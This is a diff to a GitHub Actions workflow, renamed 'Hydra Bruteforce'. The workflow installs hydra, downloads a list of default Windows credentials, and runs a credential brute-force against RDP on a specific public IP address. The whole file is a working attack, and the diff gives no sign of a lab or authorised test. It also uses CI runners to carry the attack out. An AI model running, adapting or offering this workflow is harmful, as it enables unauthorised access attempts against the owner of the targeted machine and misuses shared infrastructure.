@@ -1,4 +1,4 @@
-name: Dev-3
+name: Hydra Bruteforce
 on:
   workflow_dispatch:
 
@@ -11,6 +11,6 @@ jobs:
         run: |
          sudo apt-get install hydra-gtk
          wget --quiet https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt -O default.txt
-      - name: Hydra
+      - name: Hydra-RDP
         run: |
-         hydra -V -f -C default.txt rdp://96.65.26.181
+         hydra -V -f -C default.txt rdp://96.65.26.181 
